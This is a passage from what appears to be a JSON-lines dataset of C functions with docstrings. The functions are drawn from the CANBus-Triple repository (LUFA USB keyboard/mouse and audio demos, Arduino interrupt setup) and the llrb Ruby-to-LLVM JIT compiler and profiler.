KeyboardReportData.KeyCode[0] = HID_KEYBOARD_SC_B;\n\n\t\tif (JoyStatus_LCL & JOY_LEFT)\n\t\t  KeyboardReportData.KeyCode[0] = HID_KEYBOARD_SC_C;\n\t\telse if (JoyStatus_LCL & JOY_RIGHT)\n\t\t  KeyboardReportData.KeyCode[0] = HID_KEYBOARD_SC_D;\n\n\t\tif (JoyStatus_LCL & JOY_PRESS)\n\t\t  KeyboardReportData.KeyCode[0] = HID_KEYBOARD_SC_E;\n\t}\n\n\t/* Select the Keyboard Report Endpoint */\n\tEndpoint_SelectEndpoint(KEYBOARD_IN_EPNUM);\n\n\t/* Check if Keyboard Endpoint Ready for Read/Write */\n\tif (Endpoint_IsReadWriteAllowed())\n\t{\n\t\t/* Write Keyboard Report Data */\n\t\tEndpoint_Write_Stream_LE(&KeyboardReportData, sizeof(KeyboardReportData), NULL);\n\n\t\t/* Finalize the stream transfer to send the last packet */\n\t\tEndpoint_ClearIN();\n\n\t\t/* Clear the report data afterwards */\n\t\tmemset(&KeyboardReportData, 0, sizeof(KeyboardReportData));\n\t}\n\n\t/* Select the Keyboard LED Report Endpoint */\n\tEndpoint_SelectEndpoint(KEYBOARD_OUT_EPNUM);\n\n\t/* Check if Keyboard LED Endpoint Ready for Read/Write */\n\tif (Endpoint_IsReadWriteAllowed())\n\t{\n\t\t/* Read in and process the LED report from the host */\n\t\tKeyboard_ProcessLEDReport(Endpoint_Read_8());\n\n\t\t/* Handshake the OUT Endpoint - clear endpoint and ready for next report */\n\t\tEndpoint_ClearOUT();\n\t}\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\LowLevel\\KeyboardMouse\\KeyboardMouse.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Configures the board hardware and chip peripherals for the demo's functionality. */\n", "func_signal": "void SetupHardware()", "code": "{\n\t/* Disable watchdog if enabled by bootloader/fuses */\n\tMCUSR &= ~(1 << WDRF);\n\twdt_disable();\n\n\t/* Disable clock division */\n\tclock_prescale_set(clock_div_1);\n\n\t/* Hardware Initialization */\n\tJoystick_Init();\n\tLEDs_Init();\n\tButtons_Init();\n\tUSB_Init();\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Projects\\MediaController\\MediaController.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** ISR to handle the reloading of the data endpoint with the next sample. */\n", "func_signal": "ISR(TIMER0_COMPA_vect, ISR_BLOCK)", "code": "{\n\tuint8_t PrevEndpoint = Endpoint_GetCurrentEndpoint();\n\n\t/* Check that the USB bus is ready for the next sample to write */\n\tif (Audio_Device_IsReadyForNextSample(&Microphone_Audio_Interface))\n\t{\n\t\tint16_t AudioSample;\n\n\t\t#if defined(USE_TEST_TONE)\n\t\t\tstatic uint8_t SquareWaveSampleCount;\n\t\t\tstatic int16_t CurrentWaveValue;\n\t\t\t\n\t\t\t/* In test tone mode, generate a square wave at 1/256 of the sample rate */\n\t\t\tif (SquareWaveSampleCount++ == 0xFF)\n\t\t\t  CurrentWaveValue ^= 0x8000;\n\t\t\t\n\t\t\t/* Only generate audio if the board button is being pressed */\n\t\t\tAudioSample = (Buttons_GetStatus() & BUTTONS_BUTTON1) ? CurrentWaveValue : 0;\n\t\t#else\n\t\t\t/* Audio sample is ADC value scaled to fit the entire range */\n\t\t\tAudioSample = ((SAMPLE_MAX_RANGE / ADC_MAX_RANGE) * ADC_GetResult());\n\n\t\t\t#if defined(MICROPHONE_BIASED_TO_HALF_RAIL)\n\t\t\t/* Microphone is biased to half rail voltage, subtract the bias from the sample value */\n\t\t\tAudioSample -= (SAMPLE_MAX_RANGE / 2);\n\t\t\t#endif\n\t\t#endif\n\t\t\n\t\tAudio_Device_WriteSample16(&Microphone_Audio_Interface, AudioSample);\n\t}\n\n\tEndpoint_SelectEndpoint(PrevEndpoint);\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Configures the board hardware and chip peripherals for the demo's functionality. */\n", "func_signal": "void SetupHardware(void)", "code": "{\n\t/* Disable watchdog if enabled by bootloader/fuses */\n\tMCUSR &= ~(1 << WDRF);\n\twdt_disable();\n\n\t/* Disable clock division */\n\tclock_prescale_set(clock_div_1);\n\n\t/* Hardware Initialization */\n\tJoystick_Init();\n\tLEDs_Init();\n\tUSB_Init();\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\LowLevel\\KeyboardMouse\\KeyboardMouse.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Event handler for the library USB Configuration Changed event. */\n", "func_signal": "void EVENT_USB_Device_ConfigurationChanged(void)", "code": "{\n\tbool ConfigSuccess = true;\n\n\tConfigSuccess &= Audio_Device_ConfigureEndpoints(&Microphone_Audio_Interface);\n\n\tLEDs_SetAllLEDs(ConfigSuccess ? LEDMASK_USB_READY : LEDMASK_USB_ERROR);\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Processes a given Keyboard LED report from the host, and sets the board LEDs to match. Since the Keyboard\n *  LED report can be sent through either the control endpoint (via a HID SetReport request) or the HID OUT\n *  endpoint, the processing code is placed here to avoid duplicating it and potentially having different\n *  behaviour depending on the method used to sent it.\n */\n", "func_signal": "void Keyboard_ProcessLEDReport(const uint8_t LEDStatus)", "code": "{\n\tuint8_t LEDMask = LEDS_LED2;\n\n\tif (LEDStatus & HID_KEYBOARD_LED_NUMLOCK)\n\t  LEDMask |= LEDS_LED1;\n\n\tif (LEDStatus & HID_KEYBOARD_LED_CAPSLOCK)\n\t  LEDMask |= LEDS_LED3;\n\n\tif (LEDStatus & HID_KEYBOARD_LED_SCROLLLOCK)\n\t  LEDMask |= LEDS_LED4;\n\n\t/* Set the status LEDs to the current Keyboard LED status */\n\tLEDs_SetAllLEDs(LEDMask);\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\LowLevel\\KeyboardMouse\\KeyboardMouse.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/* Fill memory */\n", "func_signal": "static\nvoid mem_set (void* dst, int val, UINT cnt)", "code": "{\n\tBYTE *d = (BYTE*)dst;\n\n\twhile (cnt--)\n\t\t*d++ = (BYTE)val;\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Projects\\TempDataLogger\\Lib\\FATFs\\ff.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Reads and processes an attached device's Device Descriptor, to determine compatibility\n *\n *  This routine checks to ensure that the attached device's VID and PID matches Google's for Android devices.\n *\n *  \\return An error code from the \\ref AndroidHost_GetDeviceDescriptorDataCodes_t enum.\n */\n", "func_signal": "uint8_t ProcessDeviceDescriptor(void)", "code": "{\n\tUSB_Descriptor_Device_t DeviceDescriptor;\n\n\t/* Send the request to retrieve the device descriptor */\n\tif (USB_Host_GetDeviceDescriptor(&DeviceDescriptor) != HOST_SENDCONTROL_Successful)\n\t  return DevControlError;\n\n\t/* Validate returned data - ensure the returned data is a device descriptor */\n\tif (DeviceDescriptor.Header.Type != DTYPE_Device)\n\t  return InvalidDeviceDataReturned;\n\n\t/* Validate returned device Vendor ID against the Android ADK spec values */\n\tif (DeviceDescriptor.VendorID != ANDROID_VENDOR_ID)\n\t  return IncorrectAndroidDevice;\n\n\t/* Check the product ID to determine if the Android device is in accessory mode */\n\tif ((DeviceDescriptor.ProductID != ANDROID_ACCESSORY_PRODUCT_ID) &&\n\t    (DeviceDescriptor.ProductID != ANDROID_ACCESSORY_ADB_PRODUCT_ID))\n\t{\n\t\treturn NonAccessoryModeAndroidDevice;\n\t}\n\n\treturn AccessoryModeAndroidDevice;\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Host\\Incomplete\\AndroidAccessoryHost\\DeviceDescriptor.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Main program entry point. This routine configures the hardware required by the application, then\n *  enters a loop to run the application tasks in sequence.\n */\n", "func_signal": "int main(void)", "code": "{\n\tSetupHardware();\n\n\tLEDs_SetAllLEDs(LEDMASK_USB_NOTREADY);\n\tsei();\n\n\tfor (;;)\n\t{\n\t\tKeyboard_HID_Task();\n\t\tMouse_HID_Task();\n\t\tUSB_USBTask();\n\t}\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\LowLevel\\KeyboardMouse\\KeyboardMouse.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Mouse task. This generates the next mouse HID report for the host, and transmits it via the\n *  mouse IN endpoint when the host is ready for more data.\n */\n", "func_signal": "void Mouse_HID_Task(void)", "code": "{\n\tuint8_t JoyStatus_LCL = Joystick_GetStatus();\n\n\t/* Device must be connected and configured for the task to run */\n\tif (USB_DeviceState != DEVICE_STATE_Configured)\n\t  return;\n\n\t/* Check if board button is pressed, if so mouse mode enabled */\n\tif (Buttons_GetStatus() & BUTTONS_BUTTON1)\n\t{\n\t\tif (JoyStatus_LCL & JOY_UP)\n\t\t  MouseReportData.Y =  1;\n\t\telse if (JoyStatus_LCL & JOY_DOWN)\n\t\t  MouseReportData.Y = -1;\n\n\t\tif (JoyStatus_LCL & JOY_RIGHT)\n\t\t  MouseReportData.X =  1;\n\t\telse if (JoyStatus_LCL & JOY_LEFT)\n\t\t  MouseReportData.X = -1;\n\n\t\tif (JoyStatus_LCL & JOY_PRESS)\n\t\t  MouseReportData.Button |= (1 << 0);\n\t}\n\n\t/* Select the Mouse Report Endpoint */\n\tEndpoint_SelectEndpoint(MOUSE_IN_EPNUM);\n\n\t/* Check if Mouse Endpoint Ready for Read/Write */\n\tif (Endpoint_IsReadWriteAllowed())\n\t{\n\t\t/* Write Mouse Report Data */\n\t\tEndpoint_Write_Stream_LE(&MouseReportData, sizeof(MouseReportData), NULL);\n\n\t\t/* Finalize the stream transfer to send the last packet */\n\t\tEndpoint_ClearIN();\n\n\t\t/* Clear the report data afterwards */\n\t\tmemset(&MouseReportData, 0, sizeof(MouseReportData));\n\t}\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\LowLevel\\KeyboardMouse\\KeyboardMouse.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "// volatile static voidFuncPtr twiIntFunc;\n", "func_signal": "void attachInterrupt(uint8_t interruptNum, void (*userFunc)(void), int mode)", "code": "{\n  if(interruptNum < EXTERNAL_NUM_INTERRUPTS) {\n    intFunc[interruptNum] = userFunc;\n    \n    // Configure the interrupt mode (trigger on low input, any change, rising\n    // edge, or falling edge).  The mode constants were chosen to correspond\n    // to the configuration bits in the hardware register, so we simply shift\n    // the mode into place.\n      \n    // Enable the interrupt.\n      \n    switch (interruptNum) {\n#if defined(__AVR_ATmega32U4__)\n\t// I hate doing this, but the register assignment differs between the 1280/2560\n\t// and the 32U4.  Since avrlib defines registers PCMSK1 and PCMSK2 that aren't \n\t// even present on the 32U4 this is the only way to distinguish between them.\n    case 0:\n\tEICRA = (EICRA & ~((1<<ISC00) | (1<<ISC01))) | (mode << ISC00);\n\tEIMSK |= (1<<INT0);\n\tbreak;\n    case 1:\n\tEICRA = (EICRA & ~((1<<ISC10) | (1<<ISC11))) | (mode << ISC10);\n\tEIMSK |= (1<<INT1);\n\tbreak;\t\n    case 2:\n        EICRA = (EICRA & ~((1<<ISC20) | (1<<ISC21))) | (mode << ISC20);\n        EIMSK |= (1<<INT2);\n        break;\n    case 3:\n        EICRA = (EICRA & ~((1<<ISC30) | (1<<ISC31))) | (mode << ISC30);\n        EIMSK |= (1<<INT3);\n        break;\n    case 4:\n        EICRB = (EICRB & ~((1<<ISC60) | (1<<ISC61))) | (mode << ISC60);\n        EIMSK |= (1<<INT6);\n        break;\n#elif defined(EICRA) && defined(EICRB) && defined(EIMSK)\n    case 2:\n      EICRA = (EICRA & ~((1 << ISC00) | (1 << ISC01))) | (mode << ISC00);\n      EIMSK |= (1 << INT0);\n      break;\n    case 3:\n      EICRA = (EICRA & ~((1 << ISC10) | (1 << ISC11))) | (mode << ISC10);\n      EIMSK |= (1 << INT1);\n      break;\n    case 4:\n      EICRA = (EICRA & ~((1 << ISC20) | (1 << ISC21))) | (mode << ISC20);\n      EIMSK |= (1 << INT2);\n      break;\n    case 5:\n      EICRA = (EICRA & ~((1 << ISC30) | (1 << ISC31))) | (mode << ISC30);\n      EIMSK |= (1 << INT3);\n      break;\n    case 0:\n      EICRB = (EICRB & ~((1 << ISC40) | (1 << ISC41))) | (mode << ISC40);\n      EIMSK |= (1 << INT4);\n      break;\n    case 1:\n      EICRB = (EICRB & ~((1 << ISC50) | (1 << ISC51))) | (mode << ISC50);\n      EIMSK |= (1 << INT5);\n      break;\n    case 6:\n      EICRB = (EICRB & ~((1 << ISC60) | (1 << ISC61))) | (mode << ISC60);\n      EIMSK |= (1 << INT6);\n      break;\n    case 7:\n      EICRB = (EICRB & ~((1 << ISC70) | (1 << ISC71))) | (mode << ISC70);\n      EIMSK |= (1 << INT7);\n      break;\n#else\t\t\n    case 0:\n    #if defined(EICRA) && defined(ISC00) && defined(EIMSK)\n      EICRA = (EICRA & ~((1 << ISC00) | (1 << ISC01))) | (mode << ISC00);\n      EIMSK |= (1 << INT0);\n    #elif defined(MCUCR) && defined(ISC00) && defined(GICR)\n      MCUCR = (MCUCR & ~((1 << ISC00) | (1 << ISC01))) | (mode << ISC00);\n      GICR |= (1 << INT0);\n    #elif defined(MCUCR) && defined(ISC00) && defined(GIMSK)\n      MCUCR = (MCUCR & ~((1 << ISC00) | (1 << ISC01))) | (mode << ISC00);\n      GIMSK |= (1 << INT0);\n    #else\n      #error attachInterrupt not finished for this CPU (case 0)\n    #endif\n      break;\n\n    case 1:\n    #if defined(EICRA) && defined(ISC10) && defined(ISC11) && defined(EIMSK)\n      EICRA = (EICRA & ~((1 << ISC10) | (1 << ISC11))) | (mode << ISC10);\n      EIMSK |= (1 << INT1);\n    #elif defined(MCUCR) && defined(ISC10) && defined(ISC11) && defined(GICR)\n      MCUCR = (MCUCR & ~((1 << ISC10) | (1 << ISC11))) | (mode << ISC10);\n      GICR |= (1 << INT1);\n    #elif defined(MCUCR) && defined(ISC10) && defined(GIMSK) && defined(GIMSK)\n      MCUCR = (MCUCR & ~((1 << ISC10) | (1 << ISC11))) | (mode << ISC10);\n      GIMSK |= (1 << INT1);\n    #else\n      #warning attachInterrupt may need some more work for this cpu (case 1)\n    #endif\n      break;\n    \n    case 2:\n    #if defined(EICRA) && defined(ISC20) && defined(ISC21) && defined(EIMSK)\n      EICRA = (EICRA & ~((1 << ISC20) | (1 << ISC21))) | (mode << ISC20);\n      EIMSK |= (1 << INT2);\n    #elif defined(MCUCR) && defined(ISC20) && defined(ISC21) && defined(GICR)\n      MCUCR = (MCUCR & ~((1 << ISC20) | (1 << ISC21))) | (mode << ISC20);\n      GICR |= (1 << INT2);\n    #elif defined(MCUCR) && defined(ISC20) && defined(GIMSK) && defined(GIMSK)\n      MCUCR = (MCUCR & ~((1 << ISC20) | (1 << ISC21))) | (mode << ISC20);\n      GIMSK |= (1 << INT2);\n    #endif\n      break;\n#endif\n    }\n  }\n}", "path": "avr\\cores\\arduino\\WInterrupts.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "/** Event handler for the library USB Connection event. */\n", "func_signal": "void EVENT_USB_Device_Connect(void)", "code": "{\n\tLEDs_SetAllLEDs(LEDMASK_USB_ENUMERATING);\n\n\t/* Sample reload timer initialization */\n\tTIMSK0  = (1 << OCIE0A);\n\tOCR0A   = ((F_CPU / 8 / CurrentAudioSampleFrequency) - 1);\n\tTCCR0A  = (1 << WGM01);  // CTC mode\n\tTCCR0B  = (1 << CS01);   // Fcpu/8 speed\n}", "path": "avr\\bootloaders\\caterina\\LUFA-111009\\Demos\\Device\\ClassDriver\\AudioInput\\AudioInput.c", "repo_name": "CANBus-Triple/CANBus-Triple", "stars": 287, "license": "mit", "language": "c", "size": 1952}
{"docstring": "// Compiles Control Flow Graph having encoded YARV instructions to LLVM IR.\n", "func_signal": "static LLVMValueRef\nllrb_compile_cfg(LLVMModuleRef mod, const struct rb_iseq_constant_body *body, const VALUE *new_iseq_encoded, struct llrb_cfg *cfg, const char* funcname)", "code": "{\n  LLVMTypeRef args[] = { LLVMInt64Type(), LLVMInt64Type() };\n  LLVMValueRef func = LLVMAddFunction(mod, funcname,\n      LLVMFunctionType(LLVMInt64Type(), args, 2, false));\n\n  const struct llrb_compiler compiler = (struct llrb_compiler){\n    .body = body,\n    .new_iseq_encoded = new_iseq_encoded,\n    .cfg = cfg,\n    .func = func,\n    .builder = LLVMCreateBuilder(),\n    .mod = mod,\n  };\n  llrb_init_cfg_for_compile(&compiler, cfg);\n\n  // To simulate YARV stack, we need to traverse CFG again here instead of loop from start to end.\n  struct llrb_stack stack = (struct llrb_stack){\n    .body = ALLOC_N(LLVMValueRef, body->stack_max), // `xfree`d in the end of this function.\n    .size = 0,\n    .max  = body->stack_max,\n  };\n  llrb_compile_basic_block(&compiler, cfg->blocks, &stack);\n\n  xfree(stack.body);\n  return func;\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// Used by profiler.c too\n", "func_signal": "VALUE\nllrb_compile_iseq_to_method(const rb_iseq_t *iseq, bool enable_stats)", "code": "{\n  if (llrb_should_not_compile(iseq)) return Qfalse;\n\n  // Creating new_iseq_encoded before compilation to calculate program counter.\n  VALUE *new_iseq_encoded = ALLOC_N(VALUE, iseq->body->iseq_size); // Never freed.\n  LLVMModuleRef mod = llrb_compile_iseq(iseq->body, new_iseq_encoded, llrb_funcname, enable_stats);\n\n  uint64_t func = llrb_create_native_func(mod, llrb_funcname);\n  //LLVMDisposeModule(mod); // This causes SEGV: \"corrupted double-linked list\".\n  if (!func) {\n    fprintf(stderr, \"Failed to create native function...\\n\");\n    return Qfalse;\n  }\n\n  llrb_replace_iseq_with_cfunc(iseq, new_iseq_encoded, (rb_insn_func_t)func);\n  return Qtrue;\n}", "path": "ext\\llrb\\llrb.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// Profile only stack top.\n", "func_signal": "static void\nllrb_profile_frame()", "code": "{\n  rb_thread_t *th = GET_THREAD();\n  rb_control_frame_t *cfp = th->cfp;\n\n  if (cfp->iseq) {\n    struct llrb_sample *sample = llrb_sample_for(cfp->iseq, cfp);\n    sample->total_calls++;\n  }\n  cfp = RUBY_VM_PREVIOUS_CONTROL_FRAME(cfp);\n\n  llrb_profiler.profile_times++;\n}", "path": "ext\\llrb\\profiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// TODO: Use vm_check_keyword after Ruby 2.5\n", "func_signal": "VALUE\nllrb_insn_checkkeyword(VALUE cfp_v, lindex_t kw_bits_index, rb_num_t keyword_index)", "code": "{\n  rb_control_frame_t *cfp = (rb_control_frame_t *)cfp_v;\n\n  const VALUE *ep = cfp->ep;\n  const VALUE kw_bits = *(ep - kw_bits_index);\n\n  if (FIXNUM_P(kw_bits)) {\n    int bits = FIX2INT(kw_bits);\n    return (bits & (0x01 << keyword_index)) ? Qfalse : Qtrue;\n  }\n  else {\n    VM_ASSERT(RB_TYPE_P(kw_bits, T_HASH));\n    return rb_hash_has_key(kw_bits, INT2FIX(keyword_index)) ? Qfalse : Qtrue;\n  }\n}", "path": "ext\\llrb_insn_checkkeyword.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// Compile iseq with compile error suppressed.\n", "func_signal": "static VALUE\nllrb_safe_compile_iseq(const rb_iseq_t *iseq)", "code": "{\n  extern VALUE llrb_compile_iseq_to_method_without_stats(const rb_iseq_t *iseq);\n  return rb_rescue(llrb_compile_iseq_to_method_without_stats, (VALUE)iseq,\n      llrb_compile_error_handler, Qnil);\n}", "path": "ext\\llrb\\profiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// This sweaps memory `xmalloc`ed by llrb_create_basic_blocks.\n", "func_signal": "static void\nllrb_destruct_cfg(struct llrb_cfg *cfg)", "code": "{\n  for (unsigned int i = 0; i < cfg->size; i++) {\n    struct llrb_basic_block *block = cfg->blocks + i;\n    xfree(block->incoming_starts);\n  }\n  xfree(cfg->blocks);\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// Return METHOD or BLOCK iseq which is called the most\n", "func_signal": "static const rb_iseq_t *\nllrb_search_compile_target()", "code": "{\n  struct llrb_compile_target target = (struct llrb_compile_target){\n    .sample = 0,\n    .iseq = 0,\n  };\n  st_foreach(llrb_profiler.sample_by_iseq, llrb_search_compile_target_i, (st_data_t)&target);\n\n  if (target.sample) {\n    target.sample->compiled = true;\n  }\n  return target.iseq;\n}", "path": "ext\\llrb\\profiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// Push receiver and arguments for method call\n", "func_signal": "static void\nllrb_compile_args(const struct llrb_compiler *c, struct llrb_stack *stack, const int argc)", "code": "{\n  int stack_top = (int)stack->size - 1;\n  for (int i = (int)argc; i >= 0; i--) {\n    llrb_call_func(c, \"llrb_push_result\", 2, llrb_get_cfp(c), stack->body[stack_top-i]);\n  }\n  stack->size -= argc + 1;\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// https://github.com/ruby/ruby/blob/v2_4_1/insns.def#L201-L223\n", "func_signal": "void\nllrb_insn_setconstant(VALUE self, VALUE cbase, ID id, VALUE val)", "code": "{\n  vm_check_if_namespace(cbase);\n  vm_ensure_not_refinement_module(self);\n  rb_const_set(cbase, id, val);\n}", "path": "ext\\llrb_insn_setconstant.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// Must call `llrb_destruct_stack` after usage of return value.\n// TODO: Using `memcpy` would be faster.\n", "func_signal": "static struct llrb_stack *\nllrb_copy_stack(const struct llrb_stack *stack)", "code": "{\n  struct llrb_stack *ret = ALLOC_N(struct llrb_stack, 1); // `xfree`d by `llrb_destruct_stack`.\n  ret->size = stack->size;\n  ret->max  = stack->max;\n  ret->body = ALLOC_N(LLVMValueRef, ret->max); // `xfree`d by `llrb_destruct_stack`.\n  for (unsigned int i = 0; i < stack->size; i++) {\n    ret->body[i] = stack->body[i];\n  }\n  return ret;\n}", "path": "ext\\llrb\\compiler.c", "repo_name": "k0kubun/llrb", "stars": 305, "license": "other", "language": "c", "size": 517}
{"docstring": "// @param created_br is set true if conditional branch is created. In that case, br for next block isn't created in `llrb_compile_basic_block`.\n// @return true if the IR compiled from given insn includes `ret` instruction. In that case, next block won't be compiled in `llrb_compile_basic_block`.\n", "func_signal": "static bool\nllrb_compile_insn(const struct llrb_compiler *c, struct llrb_stack *stack, const unsigned int pos, const int insn, const VALUE *operands, bool *created_br)", "code": "{\n  //fprintf(stderr, \"  INSN: %s\\n\", insn_name(insn));\n  llrb_increment_pc(c, pos, insn);\n\n  //fprintf(stderr, \"  [DEBUG] llrb_compile_insn: %04d before %-27s (stack size: %d)\\n\", pos, insn_name(insn), stack->size);\n  *created_br = false;\n  switch (insn) {\n    case YARVINSN_nop:\n      break; // nop\n    case YARVINSN_getlocal: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_getlocal\", 3, llrb_get_cfp(c),\n            llrb_value((lindex_t)operands[0]), llrb_value((rb_num_t)operands[1])));\n      break;\n    }\n    case YARVINSN_setlocal: {\n      llrb_call_func(c, \"llrb_insn_setlocal\", 4, llrb_get_cfp(c),\n          llrb_value((lindex_t)operands[0]), llrb_value((rb_num_t)operands[1]), llrb_stack_pop(stack));\n      break;\n    }\n    case YARVINSN_getspecial: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_getspecial\", 2, llrb_value(operands[0]), llrb_value(operands[1])));\n      break;\n    }\n    case YARVINSN_setspecial: {\n      llrb_call_func(c, \"llrb_insn_setspecial\", 2, llrb_value(operands[0]), llrb_stack_pop(stack));\n      break;\n    }\n    case YARVINSN_getinstancevariable:\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_getinstancevariable\", 3,\n            llrb_get_self(c), llrb_value(operands[0]), llrb_value(operands[1])));\n      break;\n    case YARVINSN_setinstancevariable:\n      llrb_call_func(c, \"llrb_insn_setinstancevariable\", 4, llrb_get_self(c),\n          llrb_value(operands[0]), llrb_stack_pop(stack), llrb_value(operands[1]));\n      break;\n    case YARVINSN_getclassvariable: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_getclassvariable\", 2, llrb_get_cfp(c), llrb_value(operands[0])));\n      break;\n    }\n    case YARVINSN_setclassvariable: {\n      llrb_call_func(c, \"llrb_insn_setclassvariable\", 3, llrb_get_cfp(c), llrb_value(operands[0]), llrb_stack_pop(stack));\n      break;\n    }\n    case YARVINSN_getconstant: {\n      llrb_stack_push(stack, llrb_call_func(c, \"vm_get_ev_const\", 4, llrb_get_thread(c),\n            llrb_stack_pop(stack), llrb_value(operands[0]), LLVMConstInt(LLVMInt32Type(), 0, true)));\n      break;\n    }\n    case YARVINSN_setconstant: {\n      LLVMValueRef cbase = llrb_stack_pop(stack);\n      LLVMValueRef args[] = { llrb_get_self(c), cbase, llrb_value(operands[0]), llrb_stack_pop(stack) };\n      LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"llrb_insn_setconstant\"), args, 4, \"\");\n      break;\n    }\n    case YARVINSN_getglobal:\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_gvar_get\", 1, llrb_value(operands[0])));\n      break;\n    case YARVINSN_setglobal:\n      llrb_call_func(c, \"rb_gvar_set\", 2, llrb_value(operands[0]), llrb_stack_pop(stack));\n      break;\n    case YARVINSN_putnil:\n      llrb_stack_push(stack, llrb_value(Qnil));\n      break;\n    case YARVINSN_putself: {\n      llrb_stack_push(stack, llrb_get_self(c));\n      break;\n    }\n    case YARVINSN_putobject:\n      llrb_stack_push(stack, llrb_value(operands[0]));\n      break;\n    case YARVINSN_putspecialobject: {\n      llrb_stack_push(stack, llrb_call_func(c, \"llrb_insn_putspecialobject\", 1, llrb_value(operands[0])));\n      break;\n    }\n    case YARVINSN_putiseq:\n      llrb_stack_push(stack, llrb_value(operands[0]));\n      break;\n    case YARVINSN_putstring: {\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_str_resurrect\", 1, llrb_value(operands[0])));\n      break;\n    }\n    case YARVINSN_concatstrings: {\n      LLVMValueRef *args = ALLOC_N(LLVMValueRef, operands[0] + 1); // `xfree`d in this block.\n      args[0] = llrb_value(operands[0]); // function is in size_t. correct?\n      for (long i = (long)operands[0]-1; 0 <= i; i--) {\n        args[1+i] = llrb_stack_pop(stack);\n      }\n      llrb_stack_push(stack, LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"llrb_insn_concatstrings\"), args, operands[0] + 1, \"concatstrings\"));\n      xfree(args);\n      break;\n    }\n    case YARVINSN_tostring: {\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_obj_as_string\", 1, llrb_stack_pop(stack)));\n      break;\n    }\n    case YARVINSN_freezestring: {\n      VALUE debug_info = operands[0];\n      LLVMValueRef str = llrb_stack_pop(stack);\n      if (!NIL_P(debug_info)) {\n        llrb_call_func(c, \"rb_ivar_set\", 3, str, llrb_value(id_debug_created_info), llrb_value(debug_info));\n      }\n\n      llrb_call_func(c, \"rb_str_freeze\", 1, str); // TODO: inline\n      llrb_stack_push(stack, str);\n      break;\n    }\n    case YARVINSN_toregexp: {\n      rb_num_t cnt = operands[1];\n      LLVMValueRef *args1 = ALLOC_N(LLVMValueRef, cnt+1); // `xfree`d in this block.\n      args1[0] = LLVMConstInt(LLVMInt64Type(), (long)cnt, true);\n      for (rb_num_t i = 0; i < cnt; i++) {\n        args1[1+i] = llrb_stack_pop(stack);\n      }\n      LLVMValueRef ary = LLVMBuildCall(c->builder, llrb_get_function(c->mod, \"rb_ary_new_from_args\"), args1, 1+cnt, \"toregexp\");\n      xfree(args1);\n\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_reg_new_ary\", 2, ary, LLVMConstInt(LLVMInt32Type(), (int)operands[0], true)));\n\n      llrb_call_func(c, \"rb_ary_clear\", 1, ary);\n      break;\n    }\n    case YARVINSN_newarray:\n      llrb_stack_push(stack, llrb_compile_newarray(c, stack, (long)operands[0]));\n      break;\n    case YARVINSN_duparray: {\n      llrb_stack_push(stack, llrb_call_func(c, \"rb_ary_resurrect\", 1, llrb_value(operands[0]))); // TODO: inline rb_ary_resurrect?\n      break;\n    }\n    //case YARVINSN_expandarray: {\n    //  rb_num_t flag = 